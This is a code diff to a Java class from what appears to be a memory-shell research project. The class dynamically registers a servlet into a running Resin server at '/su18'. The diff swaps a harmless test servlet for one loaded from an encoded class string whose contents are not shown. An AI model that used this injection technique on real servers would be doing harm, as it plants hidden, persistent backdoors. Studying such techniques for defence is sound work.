@@ -4,7 +4,8 @@ import com.caucho.server.dispatch.ServletMapper;
 import com.caucho.server.dispatch.ServletMapping;
 import com.caucho.server.webapp.WebApp;
 
-import javax.servlet.*;
+import javax.servlet.Servlet;
+import javax.servlet.ServletException;
 import javax.servlet.http.HttpServlet;
 import javax.servlet.http.HttpServletRequest;
 import javax.servlet.http.HttpServletResponse;
@@ -13,6 +14,8 @@ import java.lang.reflect.Field;
 import java.util.HashSet;
 import java.util.Map;
 import java.util.Set;
+
+import static org.su18.memshell.test.resin.DynamicUtils.SERVLET_CLASS_STRING;
 
 /**
  * 来自文章 https://xz.aliyun.com/t/9639
@@ -32,7 +35,7 @@ public class AddResinServlet extends HttpServlet {
 			String                          servletUrl  = "/su18";
 			com.caucho.server.webapp.WebApp web         = (com.caucho.server.webapp.WebApp) req.getServletContext();
 
-			TestServlet servlet = new TestServlet();
+			Servlet servlet = (Servlet) DynamicUtils.getClass(SERVLET_CLASS_STRING).newInstance();
 
 			com.caucho.server.dispatch.ServletMapping mapping = new com.caucho.server.dispatch.ServletMapping();
 			mapping.setServletClass(servlet.getClass().getName());
@@ -64,34 +67,4 @@ public class AddResinServlet extends HttpServlet {
 		}
 
 	}
-
-
-	public static class TestServlet implements Servlet {
-
-		@Override
-		public void init(ServletConfig servletConfig) throws ServletException {
-
-		}
-
-		@Override
-		public ServletConfig getServletConfig() {
-			return null;
-		}
-
-		@Override
-		public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {
-			servletResponse.getWriter().println("su18 Resin Servlet~");
-		}
-
-		@Override
-		public String getServletInfo() {
-			return null;
-		}
-
-		@Override
-		public void destroy() {
-
-		}
-	}
-
 }
